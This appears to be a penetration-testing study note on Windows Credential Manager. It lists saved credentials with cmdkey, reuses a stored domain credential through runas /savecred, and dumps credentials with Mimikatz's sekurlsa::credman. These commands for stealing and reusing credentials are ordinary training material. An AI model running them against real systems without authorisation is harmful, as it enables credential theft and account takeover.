## Windows Vault and Credential Manager
| Name                | Description                                                                                                                                                           |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Web Credentials     | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.                             |
| Windows Credentials | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |
![[Pasted image 20260508115244.png]]

```cmd
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```
![[Pasted image 20260508115324.png]]
## Enumerating credentials with cmdkey

```cmd
C:\Users\sadams>whoami 
srv01\sadams 

C:\Users\sadams>cmdkey /list 

Currently stored credentials: 
	Target: WindowsLive:target=virtualapp/didlogical 
	Type: Generic 
	User: 02hejubrtyqjrkfi 
	Local machine persistence 
	
	Target: Domain:interactive=SRV01\mcharles 
	Type: Domain Password 
	User: SRV01\mcharles
```

```cmd
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd 
Attempting to start cmd as user "SRV01\mcharles" ...
```
## Extracting credentials with Mimikatz

```cmd
C:\Users\Administrator\Desktop> mimikatz.exe

mimikatz # privilege::debug 
Privilege '20' OK

mimikatz # sekurlsa::credman
```

